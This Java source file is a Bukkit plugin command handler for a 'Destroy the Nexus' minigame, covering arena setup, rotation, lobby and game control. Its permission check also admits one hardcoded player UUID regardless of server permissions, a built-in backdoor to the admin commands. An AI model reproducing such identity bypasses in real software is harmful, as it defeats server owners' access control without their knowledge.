package fuji.dtn.commands;

import fuji.dtn.arena.Arena;
import fuji.dtn.arena.Arenas;
import fuji.dtn.arena.ResetArena;
import fuji.dtn.arena.SelectionMode;
import fuji.dtn.game.*;
import fuji.dtn.main.Main;
import fuji.dtn.rotation.Rotation;
import fuji.dtn.teams.Teams;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.UUID;
import java.util.regex.Pattern;

/**
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * Created by Ben on 8/19/2017.
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */
public class DTNCommand implements CommandExecutor {


    @SuppressWarnings("deprecation")
	@Override
    public boolean onCommand(CommandSender commandSender, Command command, String label, String[] args) {
        Player player = (Player) commandSender;
        if (player.hasPermission("destroythenexus.admin") || player.getUniqueId().equals(UUID.fromString("5e36cc82-6029-471f-924b-9f84ac35863d"))) {
            if (command.getName().equals("dtn")) {
                if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("arena")) {
                        sendArenaSuggestions(player);
                    } else if (args[0].equalsIgnoreCase("arenas")) {
                        ArrayList<Arena> arenas = Arenas.getRegisteredArenas();
                        player.sendMessage(ChatColor.GOLD + "Arenas:");
                        if (!arenas.isEmpty()) {
                            for (int i = 0; i < arenas.size(); i++) {
                                player.sendMessage(ChatColor.GRAY + arenas.get(i).getName());
                            }
                        } else {
                            player.sendMessage(ChatColor.RED + "No arenas found.");
                        }
                    } else if (args[0].equalsIgnoreCase("rotation")) {
                        if (Rotation.getCurrentArena() != null) {
                            player.sendMessage(ChatColor.GOLD + "Current Rotation is: " + Rotation.getCurrentArena().getName());
                        } else {
                            player.sendMessage(ChatColor.RED + "Current Rotation not found.");
                        }
                    } else if (args[0].equalsIgnoreCase("game")) {
                        player.sendMessage(ChatColor.GOLD + "/dtn game start");
                        player.sendMessage(ChatColor.GOLD + "/dtn game stop");
                    } else if (args[0].equalsIgnoreCase("lobby")) {
                        player.sendMessage(ChatColor.GOLD + "/dtn lobby set");
                        player.sendMessage(ChatColor.GOLD + "/dtn lobby tp");
                    } else if (args[0].equalsIgnoreCase("gamestate")) {
                        player.sendMessage(ChatColor.GREEN + "Current state: " + GameState.getGameState().toString());
                    } else if (args[0].equalsIgnoreCase("resetall")) {
                        Arenas.resetAll();
                    }
                } else if (args.length == 2) {
                    if (args[0].equalsIgnoreCase("arena")) {
                        if (args[1] != null) {
                            String arenaName = args[1];
                            if (Arenas.isRegistered(arenaName)) {
                                Arena arena = Arenas.getArenaByName(arenaName);
                                isPlayableList(player, arena);
                                Location corner1 = arena.getArenaCorner1().getChunk().getBlock(8, 0, 8).getLocation();
                                for (int y = 0; y < 200; y++) {
                                    player.sendBlockChange(new Location(corner1.getWorld(), corner1.getBlockX(), y, corner1.getBlockZ()), Material.SEA_LANTERN, (byte) 0);
                                }

                                Location corner2 = arena.getArenaCorner2().getChunk().getBlock(8, 0, 8).getLocation();
                                for (int y = 0; y < 200; y++) {
                                    player.sendBlockChange(new Location(corner2.getWorld(), corner2.getBlockX(), y, corner2.getBlockZ()), Material.SEA_LANTERN, (byte) 0);
                                }

                                new BukkitRunnable() {

                                    @Override
                                    public void run() {
                                        Location corner1 = arena.getArenaCorner1().getChunk().getBlock(8, 0, 8).getLocation();
                                        for (int y = 0; y < 200; y++) {
                                            player.sendBlockChange(new Location(corner1.getWorld(), corner1.getBlockX(), y, corner1.getBlockZ()), Material.AIR, (byte) 0);
                                        }

                                        Location corner2 = arena.getArenaCorner2().getChunk().getBlock(8, 0, 8).getLocation();
                                        for (int y = 0; y < 200; y++) {
                                            player.sendBlockChange(new Location(corner2.getWorld(), corner2.getBlockX(), y, corner2.getBlockZ()), Material.AIR, (byte) 0);
                                        }
                                    }
                                }.runTaskLater(JavaPlugin.getPlugin(Main.class), 500L);
                            } else {
                                sendArenaSuggestions(player);
                            }
                        }
                    } else if (args[0].equalsIgnoreCase("rotation")) {
                        if (args[1].equalsIgnoreCase("next")) {
                            new Rotation();
                        }
                    } else if (args[0].equalsIgnoreCase("game")) {
                        if (args[1].equalsIgnoreCase("start")) {
                            if (Rotation.getCurrentArena() == null) {
                                try {
                                    new Rotation();
                                } catch (IllegalStateException ex) {
                                    player.sendMessage(ChatColor.RED + "You cannot start the game at this time.");
                                }
                            }

                            if (Rotation.getCurrentArena() != null) {
                                for (Player players : Bukkit.getOnlinePlayers()) {
                                    if (!Spectators.isSpectator(players)) {
                                        Players.addPlayer(players);
                                        players.sendMessage(ChatColor.BLUE + "You have been added into the Game.");
                                    }
                                }
                                Game.init(Rotation.getCurrentArena(), Players.getPlayers());
                                Game.beginGame(10);
                                player.sendMessage(ChatColor.GOLD + "Game has been started with " + ChatColor.RED + Players.getPlayers().size() + " players" + ChatColor.GOLD + " playing " + ChatColor.RED + Rotation.getCurrentArena().getName() + " by " + Rotation.getCurrentArena().getCreator());
                            }
                        } else if (args[1].equalsIgnoreCase("stop")) {
                            if (GameState.getGameState().equals(GameState.INGAME)) {
                                Game.endGame(Teams.getTeamFromPlayer(player));
                            }
                        }
                    } else if (args[0].equalsIgnoreCase("lobby")) {
                        if (args[1].equalsIgnoreCase("set")) {
                            new Lobby(player.getLocation());
                            player.sendMessage(ChatColor.GREEN + "Lobby has been set.");
                        } else if (args[1].equalsIgnoreCase("tp")) {
                            player.teleport(Lobby.getLobbyLoc());
                            player.sendMessage(ChatColor.GREEN + "Teleporting to lobby location.");
                        }
                    }

                } else if (args.length == 3) {
                    if (args[0].equalsIgnoreCase("arena")) {
                        if (args[2].equalsIgnoreCase("create")) {
                            String arenaName = args[1];
                            Pattern arenaPattern = Pattern.compile("[^a-zA-Z0-9]");
                            if (!arenaPattern.matcher(arenaName).find()) {
                                if (!Arenas.isRegistered(arenaName)) {
                                    Arena arena = new Arena(arenaName, player.getName(), 2, null, null, true, null, null, null, null, null, null);
                                    player.sendMessage(ChatColor.GOLD + "You created arena " + ChatColor.RED + arenaName + ChatColor.GOLD + "! As of now, the arena is playable: "
                                            + ChatColor.RED + arena.isPlayable() + ChatColor.GOLD + ".");
                                } else {
                                    player.sendMessage(ChatColor.RED + "That arena is already registered.");
                                }

                            } else {
                                player.sendMessage(ChatColor.RED + "Name is not valid. Do not use any characters.");
                            }

                        } else if (args[2].equalsIgnoreCase("creator")) {
                            player.sendMessage(ChatColor.GOLD + "/dtn arena <name> creator <creator>");
                        } else if (args[2].equalsIgnoreCase("setspawn")) {
                            player.sendMessage(ChatColor.GOLD + "/dtn arena <name> setspawn <red/blue>");
                        } else if (args[2].equalsIgnoreCase("setnexus")) {
                            player.sendMessage(ChatColor.GOLD + "/dtn arena <name> setnexus <red/blue>");
                        } else if (args[2].equalsIgnoreCase("setcorner")) {
                            Arena arena = Arenas.getArenaByName(args[1]);
                            if (arena != null) {
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".arenaCorner1", null);
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".arenaCorner2", null);
                                Main.arenaStorage.save();
                                SelectionMode.addPlayer(player, arena);
                                player.sendMessage(ChatColor.GOLD + "Instructions:");
                                player.sendMessage(ChatColor.GOLD + "1 - LEFT-CLICK: Sets Corner 1.");
                                player.sendMessage(ChatColor.GOLD + "2 - RIGHT-CLICK: Sets Corner 2.");
                                ItemStack itemStack = new ItemStack(Material.PRISMARINE_SHARD);
                                ItemMeta itemMeta = itemStack.getItemMeta();
                                itemMeta.setDisplayName(ChatColor.GOLD + "[Left-Click] First Pos / [Right-Click] Second Pos (" + SelectionMode.getArena(player).getName() + ")");
                                itemStack.setItemMeta(itemMeta);
                                player.getInventory().setItem(0, itemStack);
                            } else {
                                player.sendMessage(ChatColor.RED + "Arena does not exist.");
                            }
                        } else if (args[2].equalsIgnoreCase("reset")) {
                            Arena arena = Arenas.getArenaByName(args[1]);
                            if (arena != null) {
                                ResetArena.resetArena(arena, true);
                                player.sendMessage(ChatColor.GREEN + "Rebuilding last save of arena " + arena.getName() + ".");
                            } else {
                                player.sendMessage(ChatColor.RED + "Arena does not exist.");
                            }
                        } else if (args[2].equalsIgnoreCase("save")) {
                            Arena arena = Arenas.getArenaByName(args[1]);
                            if (arena != null) {
                                ResetArena.saveArena(arena, true);
                                player.sendMessage(ChatColor.GREEN + "Saved default for arena " + arena.getName() + ".");
                            } else {
                                player.sendMessage(ChatColor.RED + "Arena does not exist.");
                            }
                        }
                    } else if (args[0].equalsIgnoreCase("rotation")) {
                        if (args[1].equalsIgnoreCase("set")) {
                            if (args[2] != null) {
                                if (Arenas.isRegistered(args[2])) {
                                    Rotation.setNewArena(args[2]);
                                    player.sendMessage(ChatColor.GOLD + "You set the Rotation to: " + Rotation.getCurrentArena().getName());
                                }
                            }
                        }
                    }
                } else if (args.length == 4) {
                    if (args[0].equalsIgnoreCase("arena")) {
                        if (args[2].equalsIgnoreCase("creator")) {
                            String arenaName = args[1];
                            Arena arena = Arenas.getArenaByName(arenaName);
                            OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(args[3]);
                            arena.
                                    setCreator
                                            (offlinePlayer.
                                                    getName());
                            player.sendMessage(ChatColor.GOLD + "You set the creator of " + ChatColor.RED + arena.getName() + ChatColor.GOLD + " to be " + ChatColor.RED + arena.getCreator() + ChatColor.GOLD + ".");

                        } else if (args[2].equalsIgnoreCase("setspawn")) {
                            if (args[3].equalsIgnoreCase("red")) {
                                Location location = player.getLocation();
                                String arenaName = args[1];
                                Arena arena = Arenas.getArenaByName(arenaName);
                                arena.setRedLocation(location);
                                player.sendMessage(ChatColor.GOLD + "You set the " + ChatColor.RED + " Red Spawn Location" + ChatColor.GOLD + ".");
                            } else if (args[3].equalsIgnoreCase("blue")) {
                                Location location = player.getLocation();
                                String arenaName = args[1];
                                Arena arena = Arenas.getArenaByName(arenaName);
                                arena.setBlueLocation(location);
                                player.sendMessage(ChatColor.GOLD + "You set the " + ChatColor.BLUE + " Blue Spawn Location" + ChatColor.GOLD + ".");
                            }
                        } else if (args[2].equalsIgnoreCase("setnexus")) {
                            if (args[3].equalsIgnoreCase("red")) {
                                Arena arena = Arenas.getArenaByName(args[1]);
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".redNexusCorner1", null);
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".redNexusCorner2", null);
                                Main.arenaStorage.save();
                                SelectionMode.addPlayer(player, arena);
                                player.sendMessage(ChatColor.GOLD + "Instructions:");
                                player.sendMessage(ChatColor.GOLD + "1 - LEFT-CLICK: " + ChatColor.RED + "Sets Corner 1.");
                                player.sendMessage(ChatColor.GOLD + "2 - RIGHT-CLICK: " + ChatColor.RED + "Sets Corner 2.");
                                ItemStack itemStack = new ItemStack(Material.STICK);
                                ItemMeta itemMeta = itemStack.getItemMeta();
                                itemMeta.setDisplayName(ChatColor.RED + "[Left-Click] First Pos / [Right-Click] Second Pos " + ChatColor.GOLD + "(" + SelectionMode.getArena(player).getName() + ")");
                                itemStack.setItemMeta(itemMeta);
                                player.getInventory().setItem(0, itemStack);
                            } else if (args[3].equalsIgnoreCase("blue")) {
                                Arena arena = Arenas.getArenaByName(args[1]);
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".blueNexusCorner1", null);
                                Main.arenaStorage.get().set("Arenas." + arena.getName() + ".blueNexusCorner2", null);
                                Main.arenaStorage.save();
                                SelectionMode.addPlayer(player, arena);
                                player.sendMessage(ChatColor.GOLD + "Instructions:");
                                player.sendMessage(ChatColor.GOLD + "1 - LEFT-CLICK: " + ChatColor.BLUE + "Sets Corner 1.");
                                player.sendMessage(ChatColor.GOLD + "2 - RIGHT-CLICK: " + ChatColor.BLUE + "Sets Corner 2.");
                                ItemStack itemStack = new ItemStack(Material.BLAZE_ROD);
                                ItemMeta itemMeta = itemStack.getItemMeta();
                                itemMeta.setDisplayName(ChatColor.BLUE + "[Left-Click] First Pos / [Right-Click] Second Pos " + ChatColor.GOLD + "(" + SelectionMode.getArena(player).getName() + ")");
                                itemStack.setItemMeta(itemMeta);
                                player.getInventory().setItem(0, itemStack);
                            }
                        }
                    }
                }
            }
        } else {
            player.sendMessage(ChatColor.RED + "You do not have access to this command.");
        }
        return true;
    }

    private void isPlayableList(Player player, Arena arena) {
        player.sendMessage(ChatColor.BLUE + "Arena Name: " + arena.getName());
        player.sendMessage(ChatColor.BLUE + "Creator: " + arena.getCreator());
        if (arena.getRedLocation() != null) {
            player.sendMessage(ChatColor.BLUE + "Red Location: " + arena.getRedLocation().getBlockX() + " " + arena.getRedLocation().getBlockY() + " " + arena.getRedLocation().getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Red Location: null");
        }

        if (arena.getBlueLocation() != null) {
            player.sendMessage(ChatColor.BLUE + "Blue Location: " + arena.getBlueLocation().getBlockX() + " " + arena.getBlueLocation().getBlockY() + " " + arena.getBlueLocation().getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Blue Location: null");
        }

        if (arena.getRedNexusCorner1() != null) {
            Location redNexusC1 = arena.getRedNexusCorner1();
            player.sendMessage(ChatColor.BLUE + "Red Nexus Corner 1: " + redNexusC1.getBlockX() + " " + redNexusC1.getBlockY() + " " + redNexusC1.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Red Nexus Corner 1: null");
        }

        if (arena.getRedNexusCorner2() != null) {
            Location redNexusC2 = arena.getRedNexusCorner2();
            player.sendMessage(ChatColor.BLUE + "Red Nexus Corner 2: " + redNexusC2.getBlockX() + " " + redNexusC2.getBlockY() + " " + redNexusC2.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Red Nexus Corner 2: null");
        }

        if (arena.getBlueNexusCorner1() != null) {
            Location blueNexusC1 = arena.getBlueNexusCorner1();
            player.sendMessage(ChatColor.BLUE + "Blue Nexus Corner 1: " + blueNexusC1.getBlockX() + " " + blueNexusC1.getBlockY() + " " + blueNexusC1.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Blue Nexus Corner 1: null");
        }

        if (arena.getBlueNexusCorner2() != null) {
            Location blueNexusC2 = arena.getBlueNexusCorner2();
            player.sendMessage(ChatColor.BLUE + "Blue Nexus Corner 2: " + blueNexusC2.getBlockX() + " " + blueNexusC2.getBlockY() + " " + blueNexusC2.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Blue Nexus Corner 2: null");
        }

        if (arena.getArenaCorner1() != null) {
            Location arenaC1 = arena.getArenaCorner1();
            player.sendMessage(ChatColor.BLUE + "Arena Corner 1: " + arenaC1.getBlockX() + " " + arenaC1.getBlockY() + " " + arenaC1.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Arena Corner 1: null");
        }

        if (arena.getArenaCorner2() != null) {
            Location arenaC2 = arena.getArenaCorner2();
            player.sendMessage(ChatColor.BLUE + "Arena Corner 2: " + arenaC2.getBlockX() + " " + arenaC2.getBlockY() + " " + arenaC2.getBlockZ());
        } else {
            player.sendMessage(ChatColor.RED + "Arena Corner 2: null");
        }

        player.sendMessage(ChatColor.BLUE + "Playable: " + ChatColor.RED + arena.isPlayable());
    }

    private void sendArenaSuggestions(Player player) {
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name>");
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name> create");
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name> creator <creator>");
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name> setnexus <red/blue>");
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name> setcorner");
        player.sendMessage(ChatColor.GOLD + "/dtn arena <name> setspawn <red/blue>");
    }
}
